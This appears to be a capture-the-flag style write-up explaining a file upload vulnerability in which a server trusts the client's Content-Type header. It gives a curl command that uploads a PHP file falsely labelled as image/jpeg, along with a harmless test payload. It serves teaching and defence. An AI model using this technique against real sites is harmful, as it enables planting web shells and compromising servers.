# File Upload Vulnerability

## Definition

A File Upload vulnerability occurs when a web application allows users to upload files without properly validating their content. If the server only checks the **Content-Type** header sent by the client — and not the actual file content — an attacker can upload any file (such as a PHP script) disguised as an image.

---

## How It Works

A vulnerable application trusts the `Content-Type` header provided by the client to determine the file type. Since this header is controlled by the client, it can be forged to bypass the file type check.

### Normal Upload

```
Client sends:
  File     : photo.jpg
  Content-Type : image/jpeg
=> Server accepts
```

### Attack

```
Client sends:
  File     : shell.php (PHP code)
  Content-Type : image/jpeg (forged)
=> Server accepts — executes PHP code
```

---

## Exploit the Vulnerability

### Vulnerable Page

```
http://site.com/index.php?page=upload
```

### Steps

**1. Create a PHP file on your machine:**

```bash
echo '<?php echo "pwned"; ?>' > shell.php         for example
```

This file contains PHP code — the server should never accept it as an image.

**2. Send it with curl, forcing the Content-Type to image/jpeg:**

```bash
curl -X POST "http://site.com/index.php?page=upload" \
  -F "Upload=Upload" \
  -F "uploaded=@shell.php;type=image/jpeg"
```

**Breakdown of the command:**

```
-X POST                        => HTTP POST method like a form
-F "Upload=Upload"             => submit button of the form
-F "uploaded=@shell.php"       => sends the file shell.php
       ;type=image/jpeg        => lies about the file type
```

**3. The flag appears somewhere in the response normally XD**

```
```

### Result

The server accepted the PHP file because it trusted the `Content-Type: image/jpeg` header without verifying the actual file content.

---

## Why It Is Vulnerable

```
- The server checks only the Content-Type header
- The Content-Type is controlled by the client → easily forged
- The actual file content is never inspected
- PHP files should never be accepted by an upload form
```

---

## References

- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)